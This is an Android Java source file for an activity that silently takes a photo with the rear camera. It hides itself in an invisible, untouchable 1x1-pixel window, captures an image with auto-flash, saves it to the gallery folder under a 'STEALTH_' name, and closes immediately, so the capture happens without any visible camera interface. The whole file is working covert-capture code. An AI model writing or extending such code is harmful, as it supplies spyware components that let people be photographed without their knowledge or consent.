package com.example.myapplication555.activities;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.ImageReader;
import android.media.Image;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

/**
 * Stealth Camera Activity - Captures photos in background without UI
 * This activity is invisible and finishes immediately after taking photo
 */
public class StealthCameraActivity extends Activity {
    private static final String TAG = "StealthCameraActivity";
    public static final String EXTRA_RESULT_FILE = "result_file";
    
    private CameraManager cameraManager;
    private String rearCameraId;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private final Semaphore cameraOpenCloseLock = new Semaphore(1);
    private File imageFile;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make activity invisible and non-interactive
        setTheme(android.R.style.Theme_Translucent_NoTitleBar);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );
        
        // Minimize window to 1x1 pixel
        getWindow().setLayout(1, 1);
        
        Log.d(TAG, "🎭 Stealth camera activity started - invisible mode");
        
        // Initialize camera
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        findRearCamera();
        startBackgroundThread();
        
        // Start stealth capture
        startStealthCapture();
    }

    private void startStealthCapture() {
        try {
            // Create image file
            imageFile = createImageFile();
            if (imageFile == null) {
                Log.e(TAG, "Failed to create image file");
                finishWithError();
                return;
            }
            
            // Open camera and capture
            openCamera();
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting stealth capture", e);
            finishWithError();
        }
    }

    private void openCamera() {
        try {
            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "Time out waiting to lock camera opening");
                finishWithError();
                return;
            }
            
            if (rearCameraId == null) {
                Log.e(TAG, "No rear camera found");
                finishWithError();
                return;
            }
            
            cameraManager.openCamera(rearCameraId, stateCallback, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Cannot access camera", e);
            finishWithError();
        } catch (SecurityException e) {
            Log.e(TAG, "Camera permission not granted", e);
            finishWithError();
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted while waiting for camera", e);
            finishWithError();
        }
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            cameraDevice = camera;
            Log.d(TAG, "📸 Camera opened for stealth capture");
            
            // Setup image reader and capture immediately
            setupImageReaderAndCapture();
        }
        
        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
            Log.d(TAG, "Camera disconnected");
            finishWithError();
        }
        
        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
            Log.e(TAG, "Camera error: " + error);
            finishWithError();
        }
    };

    private void setupImageReaderAndCapture() {
        try {
            // Create image reader
            imageReader = ImageReader.newInstance(1920, 1080, 
                    android.graphics.ImageFormat.JPEG, 1);
            
            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    saveImage(reader, imageFile);
                }
            }, backgroundHandler);
            
            // Create capture session
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            try {
                                // Create capture request
                                CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                captureBuilder.addTarget(imageReader.getSurface());
                                
                                // Set auto-focus and auto-exposure
                                captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                                
                                // Capture the image
                                session.capture(captureBuilder.build(), null, backgroundHandler);
                                
                                Log.d(TAG, "✅ Stealth photo captured successfully");
                                
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error capturing image", e);
                                finishWithError();
                            }
                        }
                        
                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure capture session");
                            finishWithError();
                        }
                    }, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
            finishWithError();
        }
    }

    private void saveImage(ImageReader reader, File file) {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                
                try (FileOutputStream output = new FileOutputStream(file)) {
                    output.write(bytes);
                    output.flush();
                    Log.d(TAG, "📱 Stealth image saved to: " + file.getAbsolutePath());
                    
                    // Notify media scanner
                    Intent mediaScanIntent = new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);
                    mediaScanIntent.setData(android.net.Uri.fromFile(file));
                    sendBroadcast(mediaScanIntent);
                    
                    // Finish with success
                    finishWithSuccess(file.getAbsolutePath());
                    
                } catch (IOException e) {
                    Log.e(TAG, "Error saving image", e);
                    finishWithError();
                }
            } else {
                Log.e(TAG, "No image available");
                finishWithError();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing image", e);
            finishWithError();
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }

    private void findRearCamera() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (lensFacing != null && lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    rearCameraId = cameraId;
                    Log.d(TAG, "Found rear camera: " + cameraId);
                    break;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error finding rear camera", e);
        }
    }

    private File createImageFile() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String imageFileName = "STEALTH_" + timeStamp + "_";
            
            // Save to DCIM/Camera folder (visible in Gallery)
            File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM + "/Camera");
            
            if (storageDir != null && !storageDir.exists()) {
                storageDir.mkdirs();
            }
            
            File imageFile = File.createTempFile(imageFileName, ".jpg", storageDir);
            Log.d(TAG, "Created stealth image file: " + imageFile.getAbsolutePath());
            return imageFile;
            
        } catch (IOException e) {
            Log.e(TAG, "Error creating image file", e);
            return null;
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("StealthCameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    private void finishWithSuccess(String filePath) {
        Log.d(TAG, "🎯 Stealth capture completed successfully: " + filePath);
        
        // Send result back
        Intent resultIntent = new Intent();
        resultIntent.putExtra(EXTRA_RESULT_FILE, filePath);
        setResult(RESULT_OK, resultIntent);
        
        cleanup();
        finish();
    }

    private void finishWithError() {
        Log.e(TAG, "❌ Stealth capture failed");
        
        setResult(RESULT_CANCELED);
        cleanup();
        finish();
    }

    private void cleanup() {
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        stopBackgroundThread();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cleanup();
    }
} 